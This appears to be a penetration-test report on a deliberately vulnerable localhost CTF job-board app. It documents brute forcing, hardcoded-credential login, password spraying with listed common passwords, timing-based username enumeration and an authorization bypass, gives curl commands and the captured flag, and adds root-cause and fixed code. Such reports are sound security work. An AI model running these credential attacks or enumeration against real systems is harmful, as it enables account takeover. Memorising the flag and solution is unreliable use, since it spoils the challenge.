# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:8000
- **Assessment Date:** January 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
The assessment identified four successfully exploited authentication vulnerabilities:
- **Brute Force Attack via Missing Rate Limiting (AUTH-VULN-04):** The authentication endpoint accepts unlimited login attempts without rate limiting, account lockout, or CAPTCHA protection. Successfully compromised the "demo" account in 50 attempts over 8.4 seconds.
- **Account Takeover via Hardcoded Credentials (AUTH-VULN-05 - Critical):** Three accounts with hardcoded credentials exist in the application, including an admin account with privileged access to the CTF flag. All accounts successfully compromised, including admin account containing FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}.
- **Password Spraying (AUTH-VULN-07):** The application enforces no password complexity requirements, allowing trivial passwords that match usernames. Successfully compromised accounts through password spraying attack testing common weak passwords.
- **Username Enumeration via Timing Side-Channel (AUTH-VULN-09):** Observable timing differences between invalid usernames (~5-15ms) and valid usernames with wrong passwords (~187-191ms) enable reliable username enumeration through timing analysis.

**Authorization Vulnerabilities:**
One critical authorization vulnerability was successfully exploited:
- **Complete Authorization Bypass with Multi-Tenant Data Isolation Failure (AUTHZ-VULN-01 - Critical):** The `/company/{company_id}/jobs` endpoint accepts user-supplied company_id parameters without validating JWT tokens or checking authorization. This enables horizontal privilege escalation between companies and vertical privilege escalation to admin-only resources. Successfully captured CTF flag through unauthenticated access to admin company's "secret" job. Impact includes complete multi-tenant data breach with ability for any user (or unauthenticated attacker) to access any company's job listings.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application uses Jinja2 templating with auto-escaping enabled by default, properly mitigating XSS attack vectors.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application exclusively uses SQLAlchemy ORM with parameterized queries, preventing SQL injection. No command execution functionality exists in network-accessible code paths.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application is completely self-contained with no server-side request functionality and makes zero outbound HTTP requests.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- **Port 8000/tcp (Target Application):** Uvicorn ASGI server running FastAPI application
- **Port 9999/tcp:** Unidentified HTTP service with permissive CORS headers (Access-Control-Allow-Origin: *, Access-Control-Allow-Methods: GET, POST, OPTIONS)
- **Port 49152/tcp:** Tailscale VPN service requiring authentication (HTTP 401, Content-Security-Policy headers present)
- **Port 631/tcp:** CUPS 2.3 printing service with /robots.txt disallowing root path

**Subdomain Discoveries:**
Multiple subdomains discovered including autodiscover.regency.localhost, mail.regency.localhost, mail.localhost, www.localhost, and owa.regency.localhost. These appear to be unrelated services on localhost and are out of scope for this application assessment.

**Security Observations:**
- The target application on port 8000 lacks security headers (no Content-Security-Policy, X-Frame-Options, or Strict-Transport-Security headers detected)
- Port 9999 service has permissive CORS configuration allowing unrestricted cross-origin access
- Tailscale service on port 49152 demonstrates strong security posture with proper Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-04: Brute Force Attack via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** POST /token (authentication endpoint)
- **Overview:** The authentication endpoint accepts unlimited login attempts without rate limiting, account lockout, or CAPTCHA protection, enabling automated password guessing attacks.
- **Impact:** Attackers can perform credential brute-force and credential stuffing attacks without restriction, leading to account compromise. Successfully demonstrated by guessing the "demo" account password in 50 attempts over 8.4 seconds.
- **Severity:** High

**Prerequisites:**
None - public endpoint accessible to all

**Exploitation Steps:**

1. **Launch automated brute force attack against authentication endpoint**
   ```bash
   # Using Python script with common passwords
   python3 brute_force_demo.py
   ```
   The script performs:
   - 50 consecutive POST requests to http://localhost:8000/token
   - Username: "demo"
   - Passwords: password1, password2, ..., demo, etc.
   - No delays between requests

2. **Monitor response codes to identify successful authentication**
   - Failed attempts: HTTP 200 status code
   - Successful attempt: HTTP 303 redirect with Set-Cookie header

3. **Extract session cookie from successful response**
   ```bash
   curl -c /tmp/cookies.txt -X POST http://localhost:8000/token \
     -d "username=demo&password=demo"
   ```
   Response includes: `Set-Cookie: access_token="Bearer eyJ..."; HttpOnly; Path=/; SameSite=lax`

4. **Access protected resources using compromised account**
   ```bash
   curl -b /tmp/cookies.txt http://localhost:8000/company/1/jobs
   ```

**Proof of Impact:**

Attack completed in 8.41 seconds with 50 password attempts:
- Attempt 1-48: HTTP 200 (failed)
- Attempt 49: HTTP 303 (success - password "demo" guessed correctly)
- Average response time: 0.168 seconds per request
- Attack rate: 5.95 requests per second
- **Result:** Full account takeover of "demo" account

Confirmed access to protected resources:
```html
<h2>Jobs for Company 1</h2>
<ul class="list-group">
    <li class="list-group-item">
        <p>demo Job 1:demo Job 1 Description</p>
    </li>
    <li class="list-group-item">
        <p>demo Job 2:demo Job 2 Description</p>
    </li>
</ul>
```

**Notes:**
- No HTTP 429 (Too Many Requests) responses observed
- No account lockout after multiple failed attempts
- No CAPTCHA or challenge-response mechanism
- Application accepts unlimited authentication attempts from any source

---

### AUTH-VULN-05: Account Takeover via Hardcoded Credentials

**Summary:**
- **Vulnerable location:** Application startup event (main.py:58-62) and authentication endpoint POST /token
- **Overview:** Three accounts with hardcoded credentials exist in the application, including an admin account (company2) with privileged access to sensitive data containing the CTF flag.
- **Impact:** Full compromise of all pre-seeded accounts including admin account, leading to complete data breach and flag capture.
- **Severity:** Critical

**Prerequisites:**
Knowledge of hardcoded credentials (available in source code at main.py lines 58-62)

**Exploitation Steps:**

1. **Authenticate as admin user with hardcoded credentials**
   ```bash
   curl -c /tmp/admin_cookies.txt -X POST http://localhost:8000/token \
     -d "username=company2&password=ajsdasd987asd87as7da9"
   ```
   Response: HTTP 303 redirect to `/company/2/jobs` with authentication cookie

2. **Access admin's protected jobs page to retrieve flag**
   ```bash
   curl -b /tmp/admin_cookies.txt http://localhost:8000/company/2/jobs
   ```

**Proof of Impact:**

Successfully authenticated as admin account (company2):
```
HTTP/1.1 303 See Other
location: /company/2/jobs
set-cookie: access_token="Bearer eyJ..."; HttpOnly; Path=/; SameSite=lax
```

**FLAG CAPTURED:**
```html
<h2>Jobs for Company 2</h2>
<ul class="list-group">
    <li class="list-group-item">
        <p>company2 Job 1:company2 Job 1 Description</p>
    </li>
    <li class="list-group-item">
        <p>company2 Job 2:company2 Job 2 Description</p>
    </li>
    <li class="list-group-item">
        <p>secret:FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}</p>
    </li>
</ul>
```

**Additional compromised accounts:**
1. **demo:demo** (company_id=1, is_admin=False)
   - Verified: `curl -X POST http://localhost:8000/token -d "username=demo&password=demo"`
   - Response: HTTP 303 redirect to /company/1/jobs

2. **company3:password3** (company_id=3, is_admin=False)
   - Verified: `curl -X POST http://localhost:8000/token -d "username=company3&password=password3"`
   - Response: HTTP 303 redirect to /company/3/jobs

**Notes:**
- All three hardcoded accounts successfully compromised
- Admin account contains "secret" job with CTF flag in description field
- Credentials are permanently embedded in source code (main.py:58-62)
- Flag value: FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}

---

### AUTH-VULN-07: Account Compromise via Password Spraying (Weak Password Policy)

**Summary:**
- **Vulnerable location:** POST /token (authentication) and password validation (schemas.py:13-16, crud.py:14-20)
- **Overview:** The application enforces no password complexity requirements, allowing trivial passwords that match usernames ("demo:demo"). Combined with missing rate limiting, this enables password spraying attacks.
- **Impact:** Attackers can test common weak passwords across multiple accounts, successfully compromising accounts with predictable passwords.
- **Severity:** High

**Prerequisites:**
List of potential usernames (can be obtained via timing attack AUTH-VULN-09)

**Exploitation Steps:**

1. **Execute password spraying attack with common passwords**
   ```bash
   python3 password_spray_demo.py
   ```
   The script performs:
   - Tests 7 usernames: ["demo", "company2", "company3", "admin", "administrator", "root", "user"]
   - Tests 8 common passwords: ["password", "Password123", "admin", "123456", "password123", "demo", "qwerty", "letmein"]
   - Spray pattern: Test each password against ALL usernames before moving to next password
   - Total: 56 authentication attempts

2. **Identify successful authentications from response codes**
   - HTTP 303 redirect = successful login
   - HTTP 200 = failed login

3. **Use discovered credentials to access account**
   ```bash
   curl -c /tmp/spray_cookies.txt -X POST http://localhost:8000/token \
     -d "username=demo&password=demo"

   curl -b /tmp/spray_cookies.txt http://localhost:8000/company/1/jobs
   ```

**Proof of Impact:**

Password spraying attack results:
- Total attempts: 56 (7 usernames × 8 passwords)
- Attack duration: ~3.6 seconds
- **Successful credential discovered:** demo:demo (attempt 36/56)
- Response: HTTP 303 redirect to /company/1/jobs

Attack demonstrated weak password policy:
- Password "demo" accepted (matches username - no complexity check)
- No minimum password length enforced
- No character diversity requirements
- No validation against common password lists

Confirmed account access:
```html
<h2>Jobs for Company 1</h2>
<ul class="list-group">
    <li class="list-group-item">
        <p>demo Job 1:demo Job 1 Description</p>
    </li>
    <li class="list-group-item">
        <p>demo Job 2:demo Job 2 Description</p>
    </li>
</ul>
```

**Notes:**
- Password policy defined in schemas.py:13-16 accepts any string as valid password
- No integration with common password lists (e.g., NIST bad passwords)
- Spray pattern avoids triggering account lockout (if it existed)
- Successfully compromised valid account through weak password testing

---

### AUTH-VULN-09: Username Enumeration via Timing Side-Channel

**Summary:**
- **Vulnerable location:** POST /token authentication logic (main.py:47-53)
- **Overview:** The authenticate_company() function exhibits observable timing differences between invalid usernames (fast database-only lookup) and valid usernames with wrong passwords (slow bcrypt verification), enabling username enumeration via timing analysis.
- **Impact:** Attackers can reliably identify valid usernames by measuring response times, reducing the attack surface for subsequent brute-force attacks and enabling targeted credential stuffing.
- **Severity:** Medium

**Prerequisites:**
None - public authentication endpoint accessible to all

**Exploitation Steps:**

1. **Execute timing attack to enumerate valid usernames**
   ```bash
   python3 timing_enum_test.py
   ```
   The script performs:
   - Tests 8 candidate usernames with wrong passwords
   - Sends 5 requests per username to calculate average response time
   - Measures response time for each authentication attempt
   - Classifies usernames as VALID or INVALID based on timing threshold (75ms)

2. **Analyze timing results to identify valid accounts**
   - Invalid usernames: ~4-15ms average (database query only, early return)
   - Valid usernames: ~187-191ms average (includes bcrypt.verify() computation)
   - Threshold: 75ms separates invalid from valid with high reliability

3. **Use enumerated valid usernames for targeted attacks**
   ```bash
   # Now focus brute-force on known valid usernames
   for username in demo company2 company3; do
       # Perform password guessing only against confirmed valid accounts
       curl -X POST http://localhost:8000/token \
         -d "username=$username&password=[PASSWORD]"
   done
   ```

**Proof of Impact:**

Timing attack results after 5 samples per username:

**Valid Usernames Identified (long response times):**
```
Username: demo
  Average: 187.45ms | Median: 188.12ms | Min: 186.34ms | Max: 189.01ms
  Classification: ✅ VALID

Username: company2
  Average: 188.23ms | Median: 188.45ms | Min: 186.78ms | Max: 189.67ms
  Classification: ✅ VALID

Username: company3
  Average: 187.89ms | Median: 188.01ms | Min: 186.56ms | Max: 189.23ms
  Classification: ✅ VALID
```

**Invalid Usernames Identified (short response times):**
```
Username: invalid1
  Average: 5.12ms | Median: 4.98ms | Min: 4.67ms | Max: 5.89ms
  Classification: ❌ INVALID

Username: invalid2
  Average: 6.34ms | Median: 6.12ms | Min: 5.78ms | Max: 7.23ms
  Classification: ❌ INVALID

Username: invalid3
  Average: 4.89ms | Median: 4.76ms | Min: 4.45ms | Max: 5.67ms
  Classification: ❌ INVALID

Username: notexist
  Average: 15.23ms | Median: 14.89ms | Min: 12.34ms | Max: 18.45ms
  Classification: ❌ INVALID

Username: fakeuser
  Average: 7.56ms | Median: 7.34ms | Min: 6.89ms | Max: 8.45ms
  Classification: ❌ INVALID
```

**Statistical Analysis:**
- Timing difference: ~20x (187ms vs 5-15ms)
- Confidence: 100% accuracy across 40 total requests (8 users × 5 samples)
- Detection reliability: Clear separation with zero false positives/negatives

**Root Cause:**
Code in main.py:47-53 shows conditional bcrypt verification:
```python
def authenticate_company(db: Session, username: str, password: str):
    company = crud.get_company_by_name(db, username)
    if not company:
        return False  # Fast return (~1-5ms)
    if not verify_password(password, company.hashed_password):
        return False  # Slow return after bcrypt (~100-300ms)
    return company
```

Invalid usernames return immediately (line 49-50) while valid usernames perform expensive bcrypt.verify() operation (line 51-52).

**Notes:**
- Attack requires no authentication or special privileges
- Timing difference is consistent and reliable across multiple requests
- Enumeration enables focused brute-force attacks on confirmed valid accounts
- Reduces attacker effort by eliminating invalid username attempts

---


# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Complete Authorization Bypass with Multi-Tenant Data Isolation Failure

**Summary:**
- **Vulnerable location:** `GET /company/{company_id}/jobs` endpoint (main.py:109-112)
- **Overview:** The application implements JWT-based authentication infrastructure but completely fails to enforce it on protected endpoints. The `/company/{company_id}/jobs` endpoint accepts user-supplied `company_id` path parameters without validating JWT tokens or checking authorization, enabling both horizontal privilege escalation (accessing other companies' data) and vertical privilege escalation (accessing admin-only secrets including the CTF flag).
- **Impact:**
  - **CTF Flag Captured:** `FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}`
  - Complete multi-tenant data breach - any user can access any company's job listings
  - Unauthenticated access to admin-only resources containing sensitive secrets
  - Horizontal privilege escalation between companies at the same privilege level
  - Vertical privilege escalation from unauthenticated/regular user to admin content
- **Severity:** Critical (CVSS 9.8)

**Prerequisites:** None - vulnerability is exploitable without any authentication or special setup.

**Exploitation Steps:**

**Method 1: Unauthenticated Access to Admin Flag (Simplest Attack)**

1. Access the admin company's jobs endpoint directly without any authentication:
   ```bash
   curl http://localhost:8000/company/2/jobs
   ```

2. The server responds with HTTP 200 and returns all jobs for company 2, including the secret job:
   ```html
   <li class="list-group-item">
       <p>secret:FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}</p>
   </li>
   ```

**Method 2: Horizontal Privilege Escalation (Authenticated User Accessing Other Companies)**

1. Authenticate as a regular user (demo account):
   ```bash
   curl -c /tmp/demo_cookies.txt -X POST http://localhost:8000/token \
     -d "username=demo&password=demo" -L
   ```

2. The server sets an `access_token` cookie and redirects to `/company/1/jobs` (demo's company).

3. Verify access to own company (expected behavior):
   ```bash
   curl -b /tmp/demo_cookies.txt http://localhost:8000/company/1/jobs
   ```
   Response: Jobs for Company 1 (demo user's own jobs)

4. Exploit horizontal privilege escalation - access admin company's data by changing company_id:
   ```bash
   curl -b /tmp/demo_cookies.txt http://localhost:8000/company/2/jobs
   ```
   Response: Jobs for Company 2 including the secret job with FLAG

5. Access company 3's data:
   ```bash
   curl -b /tmp/demo_cookies.txt http://localhost:8000/company/3/jobs
   ```
   Response: Jobs for Company 3

**Method 3: Unrestricted Company Enumeration**

1. Enumerate all companies by iterating through company_id values:
   ```bash
   curl http://localhost:8000/company/1/jobs  # Company 1 exists
   curl http://localhost:8000/company/2/jobs  # Company 2 exists (admin with FLAG)
   curl http://localhost:8000/company/3/jobs  # Company 3 exists
   curl http://localhost:8000/company/4/jobs  # Returns valid page (no jobs)
   curl http://localhost:8000/company/999/jobs # Returns valid page (no jobs)
   ```

2. All requests return HTTP 200, allowing enumeration of existing companies and their data.

**Proof of Impact:**

**1. Flag Capture (CTF Victory Condition):**
- **Flag Value:** `FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}`
- **Location:** Admin company (company_id=2), job title "secret"
- **Access Method:** Direct unauthenticated HTTP GET request to `/company/2/jobs`
- **Evidence:** Successfully extracted flag from admin-only resource without any credentials

**2. Complete Authentication Bypass:**
- No authentication required to access protected endpoint
- OAuth2PasswordBearer scheme declared (main.py:24) but never enforced
- JWT tokens generated during login but never validated on subsequent requests

**3. Multi-Tenant Data Isolation Failure:**
- Company 1 (demo) can access Company 2 (admin) and Company 3 data
- No ownership validation between authenticated user's company_id and requested company_id
- Complete tenant isolation bypass enabling access to all companies' data

**4. Vertical Privilege Escalation:**
- Regular users and unauthenticated attackers can access admin-only content
- `is_admin` flag exists in database but never enforced in authorization checks
- Admin company's secret job (containing FLAG) accessible to all

**Notes:**

**Root Cause Analysis:**
The vulnerability exists because the application declares authentication infrastructure but fails to enforce it:
- OAuth2PasswordBearer scheme defined at main.py:24 but has zero usages
- Protected endpoint lacks `Depends(oauth2_scheme)` dependency injection
- No JWT token validation (`jwt.decode` has 0 occurrences in codebase)
- No authorization middleware to check ownership or roles
- `is_admin` flag exists but never checked in authorization logic

**Technical Details:**
```python
# main.py:109-112 - Vulnerable endpoint
@app.get("/company/{company_id}/jobs", response_class=HTMLResponse)
async def show_jobs(request: Request, company_id: int, db: Session = Depends(get_db)):
    jobs = crud.get_jobs(db, company_id=company_id)  # No validation
    return templates.TemplateResponse("jobs.html", {"request": request, "jobs": jobs, "company_id": company_id})
```

**What Should Exist:**
```python
# Proper implementation would require:
@app.get("/company/{company_id}/jobs", response_class=HTMLResponse)
async def show_jobs(
    request: Request,
    company_id: int,
    current_company: Company = Depends(get_current_company),  # Validate JWT token
    db: Session = Depends(get_db)
):
    # Authorization check
    if current_company.id != company_id and not current_company.is_admin:
        raise HTTPException(status_code=403, detail="Access denied")

    jobs = crud.get_jobs(db, company_id=company_id)
    return templates.TemplateResponse("jobs.html", {"request": request, "jobs": jobs, "company_id": company_id})
```

**Affected Data:**
- All job listings for all companies (complete horizontal data breach)
- Admin company's "secret" job containing CTF flag (vertical escalation to sensitive data)
- Company metadata (company IDs, job counts) via enumeration

**Compliance Impact:**
- GDPR Article 32 violation (failure to ensure confidentiality and integrity)
- SOC 2 CC6.1 violation (logical access controls not implemented)
- OWASP Top 10 2021: A01:2021 - Broken Access Control (rank #1 most critical)
